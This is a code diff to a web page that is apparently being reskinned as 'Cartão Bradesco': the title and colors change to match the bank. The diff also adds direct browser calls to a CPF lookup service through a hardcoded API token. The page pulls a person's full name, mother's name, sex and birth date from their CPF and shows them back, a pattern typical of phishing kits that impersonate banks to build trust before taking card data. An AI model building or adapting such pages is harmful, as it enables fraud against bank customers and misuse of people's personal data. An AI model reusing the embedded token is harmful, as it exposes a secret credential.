@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
   <link rel="stylesheet" href="/ml4/css/all.min-2.css">
-  <title>Cartão</title>
+  <title>Cartão Bradesco</title>
 
   <style>
     body {
@@ -22,7 +22,8 @@
       align-items: center;
       padding: 10px;
       border-bottom: 1px solid #aa9900;
-      background-color: #FFE600;
+      background-color: #ac0a2a;
+      margin-top: -20px;
     }
 
     .header img {
@@ -62,8 +63,8 @@
     }
 
     .button {
-      background-color: #FFE600;
-      color: #1c1c1c;
+      background-color: #ac0a2a;
+      color: #fff;
       padding: 15px 30px;
       border-radius: 10px;
       font-family: 'Sora', sans-serif;
@@ -79,8 +80,8 @@
     }
 
     .button2 {
-      background-color: #FFE600;
-      color: #1c1c1c;
+      background-color: #ac0a2a;
+      color: #fff;
       padding: 15px 30px;
       border-radius: 10px;
       font-family: 'Sora', sans-serif;
@@ -96,7 +97,7 @@
     }
 
     .button:hover {
-      background-color: #e6cf00;
+      background-color: #ac0a2a;
     }
 
     label {
@@ -167,7 +168,7 @@
       </button>
     </div>
 
-  <script>
+ <script>
     // Função para mostrar notificação (mantida do seu código)
     function showNotification(message) {
         const notification = document.getElementById('notification');
@@ -184,6 +185,28 @@
             alert(message);
         }
     }
+
+    // ====== ADAPTAÇÃO: token + endpoint Magma Data Hub (direto, sem PHP) ======
+    const token = '72a1fe2dc98acb8a436508e3c871360a7a797e8391a3d0a9ffbc06451319df5e';
+    const baseCpfApi = 'https://magmadatahub.com/api.php?token=' + token + '&cpf=';
+
+    // utilitário para pegar propriedade com várias chaves possíveis (case-insensitive)
+    function pickProp(obj, possibleKeys) {
+        if (!obj || typeof obj !== 'object') return undefined;
+
+        const lowerMap = {};
+        for (const k of Object.keys(obj)) {
+            lowerMap[k.toLowerCase()] = obj[k];
+        }
+
+        for (const pk of possibleKeys) {
+            if (pk == null) continue;
+            const v = lowerMap[String(pk).toLowerCase()];
+            if (v !== undefined && v !== null && String(v).trim() !== '') return v;
+        }
+        return undefined;
+    }
+    // =======================================================================
 
     document.getElementById('consultarBtn').addEventListener('click', async function () {
         const cpfInput = document.getElementById('cpf');
@@ -211,44 +234,62 @@
         }
 
         try {
-            console.log('Iniciando consulta via getCpfDataMagma.php...');
-            const seuScriptPhpUrl = `/getCpfDataMagma.php?cpf_consulta=${encodeURIComponent(cpf)}`;
-            console.log('URL da requisição para seu PHP:', seuScriptPhpUrl);
+            // ====== ADAPTAÇÃO: consulta direta na Magma Data Hub ======
+            const fetchUrl = `${baseCpfApi}${encodeURIComponent(cpf)}`;
+            console.log('Iniciando consulta via MagmaDataHub:', fetchUrl);
 
-            const response = await fetch(seuScriptPhpUrl, {
+            const response = await fetch(fetchUrl, {
                 method: 'GET',
                 headers: { 'Accept': 'application/json' }
             });
 
-            console.log('Status da resposta do seu PHP:', response.status);
-            
+            console.log('Status da resposta MagmaDataHub:', response.status);
+
             let data;
-            const responseText = await response.text();
             try {
-                data = JSON.parse(responseText);
+                data = await response.json();
             } catch (e) {
-                console.error('Falha ao fazer parse do JSON da resposta do PHP:', responseText, e);
-                throw new Error('Formato de resposta inválido do servidor.');
+                console.error('Falha ao fazer parse do JSON da resposta:', e);
+                throw new Error('Formato de resposta inválido da API.');
             }
-            
-            console.log('Dados recebidos do seu PHP (MagmaDataHub):', data);
 
-            // CONDIÇÃO AJUSTADA AQUI para checar data.nome (minúsculo)
-            if (response.ok && data && !data.error && data.cpf && data.nome) { 
-                console.log('Consulta via PHP bem sucedida e dados válidos recebidos.');
+            console.log('Dados recebidos (MagmaDataHub):', data);
 
-                // MAPEAMENTO DOS DADOS AQUI para NOME, MAE, etc. em maiúsculas
+            // A API pode retornar wrapper. Tentamos "desembrulhar" se vier 1 chave só.
+            let payload = data;
+            if (payload && typeof payload === 'object' && Object.keys(payload).length === 1) {
+                const soleKey = Object.keys(payload)[0];
+                const maybeInner = payload[soleKey];
+                if (maybeInner && typeof maybeInner === 'object') {
+                    const hasCpf = pickProp(maybeInner, ['cpf', 'CPF', 'Cpf']);
+                    const hasNome = pickProp(maybeInner, ['nome', 'NOME', 'nome_completo', 'nomeCompleto', 'NOME_COMPLETO', 'NOMERAZAO']);
+                    if (hasCpf || hasNome) payload = maybeInner;
+                }
+            }
+
+            // Mapear campos possíveis
+            const foundCpf = pickProp(payload, ['cpf', 'CPF', 'Cpf']);
+            const foundNome = pickProp(payload, ['nome', 'NOME', 'nome_completo', 'nomeCompleto', 'NOME_COMPLETO', 'NOMERAZAO']);
+            const foundMae = pickProp(payload, ['nome_mae', 'NOME_MAE', 'nomeMae', 'mae', 'MAE']);
+            const foundSexo = pickProp(payload, ['sexo', 'SEXO', 'genero', 'GENERO']);
+            const foundNascimento = pickProp(payload, ['nasc', 'NASC', 'nascimento', 'data_nasc', 'dataNascimento', 'DATA_NASC', 'NASCIMENTO']);
+
+            // CONDIÇÃO equivalente ao seu script: precisa ter cpf e nome (ou ao menos identificáveis)
+            if (response.ok && (foundCpf || cpf) && foundNome) {
+                console.log('Consulta bem sucedida e dados válidos recebidos.');
+
+                // ====== IMPORTANTE: mantém o MESMO salvamento do localStorage ======
                 const dadosUsuario = {
-                    NOME: data.nome,         // usa data.nome (minúsculo)
-                    MAE: data.nome_mae || '',// usa data.nome_mae (minúsculo)
-                    SEXO: data.sexo,         // usa data.sexo (minúsculo)
-                    NASCIMENTO: data.nascimento // usa data.nascimento (minúsculo)
+                    NOME: String(foundNome || ''),
+                    MAE: String(foundMae || ''),
+                    SEXO: String(foundSexo || ''),
+                    NASCIMENTO: String(foundNascimento || '')
                 };
 
                 localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
                 console.log('Dados (dadosUsuario) salvos no localStorage:', dadosUsuario);
 
-                // Preencher dados no modal
+                // Preencher dados no modal (mantido igual)
                 const nomeResultEl = document.getElementById('nomeResult');
                 const maeResultEl = document.getElementById('maeResult');
                 const maeContainerEl = document.getElementById('maeContainer');
@@ -258,8 +299,8 @@
                 const primeiraParteEl = document.getElementById('primeiraParte');
 
                 if (nomeResultEl) nomeResultEl.textContent = dadosUsuario.NOME;
-                
-                if (maeContainerEl) { 
+
+                if (maeContainerEl) {
                     if (dadosUsuario.MAE && dadosUsuario.MAE.trim() !== '' && maeResultEl) {
                         maeResultEl.textContent = dadosUsuario.MAE;
                         maeContainerEl.style.display = 'block';
@@ -267,22 +308,27 @@
                         maeContainerEl.style.display = 'none';
                     }
                 }
-                
-                if (sexoResultEl) sexoResultEl.textContent = dadosUsuario.SEXO;
-                if (nascimentoResultEl) nascimentoResultEl.textContent = dadosUsuario.NASCIMENTO;
+
+                if (sexoResultEl) sexoResultEl.textContent = dadosUsuario.SEXO || '—';
+                if (nascimentoResultEl) nascimentoResultEl.textContent = dadosUsuario.NASCIMENTO || '—';
 
                 if (resultadoModalEl) resultadoModalEl.style.display = 'block';
                 if (primeiraParteEl) primeiraParteEl.style.display = 'none';
                 console.log('Modal exibido com sucesso com dados da consulta.');
-            
+
             } else {
-                const errorMessage = (data && (data.message || data.msg)) || 'CPF não encontrado ou dados indisponíveis. Tente novamente.';
+                // Mensagem de erro mantendo o comportamento do seu script
+                const errorMessage =
+                    (data && (data.message || data.msg)) ||
+                    'CPF não encontrado ou dados indisponíveis. Tente novamente.';
+
                 console.log('Consulta ao CPF falhou ou dados incompletos:', errorMessage, data);
-                showNotification(errorMessage); 
+                showNotification(errorMessage);
             }
+            // ==========================================================
         } catch (error) {
             console.error('Erro detalhado na consulta:', error);
-            if(error.stack) console.error('Stack trace:', error.stack);
+            if (error.stack) console.error('Stack trace:', error.stack);
             showNotification('Erro ao consultar CPF. Tente novamente mais tarde.');
         } finally {
             consultarBtn.innerHTML = originalButtonText;
